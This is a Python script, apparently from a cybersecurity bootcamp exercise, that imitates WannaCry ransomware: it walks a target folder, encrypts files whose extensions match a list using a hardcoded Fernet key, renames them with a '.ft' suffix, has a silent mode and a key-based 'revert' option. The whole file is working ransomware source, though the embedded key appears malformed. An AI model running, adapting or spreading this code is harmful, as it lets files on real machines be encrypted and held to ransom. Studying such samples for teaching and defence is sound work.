#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'rikrdo'
__copyright__ = 'Copyright 2022, Bootcamp Cybersec '
__credits__ = ['rikrdo']
__license__ = 'GPL'
__version__ = '1.0.1'
__maintainer__ = 'rikrdo'
__email__ = 'rikrdo@rikrdo.es'
__status__ = 'Production'

import os, sys, argparse
from time import sleep
from cryptography.fernet import Fernet

# disable print
def disable_print():
    sys.stdout = open(os.devnull, 'w')

# enable print
def enable_print():
    sys.stdout = sys.__stdout__

# encrypt files
def encrypt(file):
    key = '2j3XrJLoNkrAzI0GCRl5IvAgCJPxgPxWI5QfCV8AZkY=%'
    
    fernet = Fernet(key)

    with open(file, 'rb') as files:
      	original = files.read()

    encrypted = fernet.encrypt(original)

    with open(file, 'wb') as encrypted_files:
       	encrypted_files.write(encrypted)

    os.rename(file, file+'.ft')
        
# decrypt files
def decrypt(file, key):
    try:
        fernet = Fernet(key)

        with open(file, 'rb') as enc_file:
            encrypted = enc_file.read()

        decrypted = fernet.decrypt(encrypted)

        with open(file, 'wb') as dec_file:
            dec_file.write(decrypted)
        
        decrypt_file = file[:-3]
        os.rename(file, decrypt_file)
    except:
        print('\033[91m\t[', file, '] Is not a encrypted file \u2716\033[0m')
# get file extension
def get_file_ext(file):
    ext = file.split('.')
    if len(ext) > 1:
        ext = ext[-1]
        return(ext)
    else:
        return('')

# infection logic
def wannacry(silent, path):
    files = os.listdir(path)
    ext_list = open('wannacry_ext_list.txt').read().splitlines()
    os.chdir(path)
    
    if silent == True:
        disable_print()
    else:
        enable_print()
        
    print('\033[91m\n--------------------------------\n\n   @@@ Infection Started! @@@\n\n--------------------------------\033[0m\n')

    for file in files:
        ext = get_file_ext(file)
        if ext in ext_list: 
            print('[', ext, '] ', file, '\033[92m\u2714\033[0m')
            file = encrypt(file)
            sleep(.2)
        else:
            continue

# deinfection logic
def wannalaugh(key, silent, path):
    files = os.listdir(path)
    ext_list = ['ft']
    os.chdir(path)
       
    if silent == True:
        disable_print()
    else:
        enable_print()
        
    print('\033[91m\n--------------------------------\n\n   @@@ Vaccine Unlocked! @@@\n\n--------------------------------\033[0m\n')

    for file in files:
        ext = get_file_ext(file)
        if ext in ext_list: 
            print('[', ext, '] ', file, '\033[92m\u2714\033[0m')
            file = decrypt(file, key)
            sleep(.2)
        else:
            continue

# collect arguments:
# -silent = silent mode
# -revert = revert infection
# -help = show help
# -version = app version

def main(): 
    parser = argparse.ArgumentParser()
    parser.version = '1.0.1'
    #parser.add_argument('-h', '--help', action='help', help='display this help menu')
    parser.add_argument('-v', '--version', action='version', help='display app version')
    parser.add_argument('-s', '--silent', default='False', action='store_true', help='silence stdout')
    parser.add_argument('-r', '--revert', help='with a correct key you can revert the infection')
    parser.add_argument('-p', '--path', default = './infection/', help='decide the path to be infected')
    args = parser.parse_args()    
    
    silent = args.silent
    path = args.path
    
    if args.revert:
        key = args.revert
        wannalaugh(key, silent, path)
    else:
        wannacry(silent, path)

if __name__=='__main__':
    main()
